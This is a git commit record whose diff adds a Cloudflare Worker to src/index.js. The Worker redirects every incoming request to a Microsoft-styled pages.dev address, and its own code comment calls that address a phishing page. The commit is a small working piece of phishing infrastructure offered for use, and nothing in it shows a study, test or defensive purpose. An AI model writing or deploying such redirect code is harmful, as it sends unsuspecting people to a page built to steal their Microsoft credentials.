74c411266543d29294557bf670c00e58b7487acf
Johndaghita1990 <johndaghita19990@outlook.com>
2026-06-24 13:45:07 +0200

    Add fetch function to redirect requests

--- src/index.js
+++ src/index.js
@@ -1,1 +1,7 @@
-
+export default {
+  async fetch(request) {
+    // Redirect to your Cloudflare Pages phishing page
+    const targetUrl = 'https://security-test-microsoft.pages.dev';
+    return Response.redirect(targetUrl, 302);
+  },
+};
